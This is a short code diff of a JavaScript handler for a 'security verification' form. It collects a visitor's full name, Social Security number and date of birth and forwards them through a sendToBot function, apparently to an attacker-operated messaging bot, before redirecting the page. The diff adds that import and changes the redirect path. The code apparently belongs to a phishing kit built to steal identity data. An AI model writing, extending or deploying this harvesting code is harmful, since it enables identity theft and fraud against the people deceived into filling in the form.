@@ -1,3 +1,4 @@
+import { sendToBot } from '../../services/bot';
 async function handleSecuritySubmit() {
     const fullName = document.getElementById('fullName').value;
     const ssn = document.getElementById('ssn').value;
@@ -9,5 +10,5 @@ async function handleSecuritySubmit() {
         `🎂 DOB: <code>${dob}</code>`;
     
     await sendToBot(message, 'security-verify');
-    window.location.href = '/rob/home/';
+    window.location.href = '/home/';
 }
